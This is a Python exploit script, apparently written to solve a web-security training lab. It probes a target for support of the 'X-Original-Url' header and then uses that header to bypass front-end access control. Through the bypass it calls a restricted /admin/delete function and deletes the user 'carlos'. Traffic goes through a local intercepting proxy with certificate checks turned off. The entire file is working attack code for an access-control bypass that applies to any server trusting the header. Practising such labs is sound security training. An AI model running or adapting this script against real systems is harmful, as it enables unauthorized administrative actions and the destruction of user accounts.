import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def test_header(url):
    uri = "/"
    test_page = "/idonotexist"
    headers = {'X-Original-Url' : test_page}
    r = requests.get(url + uri, headers=headers, verify=False, proxies=proxies)
    if r.status_code == 404 and "Not Found" in r.text:
        return True
    else:
        return False

def delete_user(url):
    uri = "/"
    admin_panel = "/admin"
    delete_func_path = "/admin/delete"
    params = {'username' : 'carlos'}
    headers = {'X-Original-Url' : delete_func_path}
    r = requests.get(url + uri, headers=headers, data=params, allow_redirects=False, verify=False, proxies=proxies)
    if r.status_code == 302:
        headers = {'X-Original-Url' : admin_panel}
        r = requests.get(url + uri, headers=headers, verify=False, proxies=proxies)
        if "User deleted successfully!" in r.text:
            return True
    else:
        return False
        


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]

    if not test_header(url):
        print("[-] Oooopsie, something went wrong! Exiting the script...")
        sys.exit(-1)
    print("[+] The framework in use on the remote system supports the use of the header 'X-Original-Url'")

    if not delete_user(url):
        print("[-] Oooopsie, something went wrong! Exiting the script...")
        sys.exit(-1)
    print("[+] User deleted successfully!")



if __name__ == "__main__":
    main()